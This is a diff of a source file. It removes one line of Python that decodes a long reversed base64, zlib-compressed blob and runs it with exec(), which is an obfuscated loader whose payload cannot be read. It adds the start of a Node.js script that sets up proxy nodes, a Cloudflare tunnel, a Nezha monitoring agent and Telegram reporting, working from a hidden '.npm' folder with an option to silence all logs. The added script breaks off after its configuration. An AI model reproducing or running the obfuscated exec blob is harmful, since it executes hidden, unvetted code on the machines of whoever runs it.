@@ -1,1 +1,977 @@
-_ = (lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))); exec(_('==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'))
+#!/usr/bin/env node
+
+const http = require("http");
+const axios = require("axios");
+const os = require('os');
+const fs = require("fs");
+const path = require("path");
+const crypto = require('crypto');
+const { promisify } = require('util');
+const { exec: execCommand, execSync } = require('child_process');
+const exec = promisify(execCommand);
+const UPLOAD_URL = process.env.UPLOAD_URL || '';      // 节点或订阅自动上传地址,需填写部署Merge-sub项目后的首页地址,例如：https://merge.xxx.com
+const PROJECT_URL = process.env.PROJECT_URL || '';    // 需要上传订阅或保活时需填写项目分配的url,例如：https://google.com
+const AUTO_ACCESS = process.env.AUTO_ACCESS || false; // false关闭自动保活，true开启,需同时填写PROJECT_URL变量
+const FILE_PATH = process.env.FILE_PATH || '.npm';    // 运行目录,sub节点文件保存目录
+const SUB_PATH = process.env.SUB_PATH || 'sub';       // 订阅路径
+const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;        // http服务订阅端口
+const UUID = process.env.UUID || 'e9ae3668-8f6a-489a-86b6-d327ead17459'; // 使用哪吒v1,在不同的平台运行需修改UUID,否则会覆盖
+const NEZHA_SERVER = process.env.NEZHA_SERVER || '';        // 哪吒v1填写形式: nz.abc.com:8008  哪吒v0填写形式：nz.abc.com
+const NEZHA_PORT = process.env.NEZHA_PORT || '';            // 使用哪吒v1请留空，哪吒v0需填写
+const NEZHA_KEY = process.env.NEZHA_KEY || '';              // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
+const ARGO_DOMAIN = process.env.ARGO_DOMAIN || '';          // 固定隧道域名,留空即启用临时隧道
+const ARGO_AUTH = process.env.ARGO_AUTH || '';              // 固定隧道密钥json或token,留空即启用临时隧道,json获取地址：https://json.zone.id
+const ARGO_PORT = process.env.ARGO_PORT || 8001;            // 固定隧道端口,使用token需在cloudflare后台设置和这里一致
+const S5_PORT = process.env.S5_PORT || '';                  // socks5端口，支持多端口的可以填写，否则留空
+const HY2_PORT = process.env.HY2_PORT || '';                // hy2端口，支持多端口的可以填写，否则留空
+const REALITY_PORT = process.env.REALITY_PORT || '';        // reality端口，支持多端口的可以填写，否则留空
+const CFIP = process.env.CFIP || 'saas.sin.fan';            // 节点优选域名或优选ip
+const CFPORT = process.env.CFPORT || 443;                   // 节点优选域名或优选ip对应的端口
+const NAME = process.env.NAME || '';                        // 节点名称
+const CHAT_ID = process.env.CHAT_ID || '';                  // Telegram chat_id  两个变量不全不推送节点到TG 
+const BOT_TOKEN = process.env.BOT_TOKEN || '';              // Telegram bot_token 两个变量不全不推送节点到TG 
+const SHOW_LOG = !['false', 'disable', 'no'].includes((process.env.SHOW_LOG || 'true').toLowerCase()); // 是否显示日志输出，true/yes显示，false/disable/no屏蔽，默认显示
+
+// 控制日志输出
+if (!SHOW_LOG) {
+  console.log = () => {};
+  console.error = () => {};
+}
+function alwaysLog(msg) {
+  process.stdout.write(msg + '\n');
+}
+
+// 创建运行文件夹
